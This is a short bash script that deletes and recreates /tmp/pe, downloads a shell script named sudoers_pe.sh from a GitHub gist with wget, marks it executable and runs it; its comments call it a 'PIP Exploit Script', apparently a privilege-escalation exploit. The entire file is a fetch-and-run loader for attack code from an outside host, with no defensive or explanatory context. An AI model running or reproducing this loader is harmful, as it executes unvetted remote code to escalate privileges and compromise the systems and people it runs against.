#!/bin/bash

# Clean Up
cd /
rm -rf /tmp/pe

# Download PIP Exploit Script
mkdir /tmp/pe
cd /tmp/pe
wget https://gist.githubusercontent.com/kevinnivekkevin/a9c929a632de3ff4c3b03fbbd247c6f2/raw/e740c5d73ff0a8b17ba3b54c2bfebfe102f3f197/sudoers_pe.sh
chmod +x sudoers_pe.sh

# Run PIP Exploit Script
./sudoers_pe.sh